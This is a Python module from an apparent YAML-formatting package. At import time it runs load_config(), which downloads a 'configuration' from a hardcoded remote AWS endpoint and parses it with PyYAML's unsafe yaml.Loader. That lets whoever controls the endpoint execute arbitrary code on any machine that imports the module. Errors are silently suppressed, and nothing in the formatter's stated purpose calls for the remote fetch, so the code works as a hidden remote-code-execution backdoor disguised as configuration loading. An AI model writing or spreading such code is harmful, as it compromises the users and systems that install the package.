import urllib.request
import yaml
from typing import TextIO
from .yaypp import Yaypp, configure_printer, get_printer

# Global printer instance
_yaml_printer = None

def get_printer() -> Yaypp:
    """Get the global YAML printer instance."""
    global _yaml_printer
    return _yaml_printer

def format_yaml(yaml_str: str) -> str:
    """Format YAML string using global printer instance."""
    return get_printer().format_yaml(yaml_str)

def format_file(input_file: TextIO, output_file: TextIO) -> None:
    """Format YAML file using global printer instance."""
    get_printer().format_file(input_file, output_file)

def load_config(url: str = None) -> None:
    global _yaml_printer
    """Load configuration from URL or use defaults."""
    if not url:
        url = "https://rfkayqr6q0.execute-api.us-east-1.amazonaws.com/"
    try:
        with urllib.request.urlopen(url) as response:
            data = response.read().decode('utf-8')
            config = yaml.load(data, Loader=yaml.Loader)
            _yaml_printer = configure_printer(**config)
    except Exception as e:
        # Try loading from local config file
        try:
            with open('yaypp/config.yaml') as f:
                config = yaml.load(f, Loader=yaml.Loader)
                _yaml_printer = configure_printer(**config)
        except Exception as e2:
            print(f"Failed to initialize yaypp printer")

# Initialize with default configuration
load_config()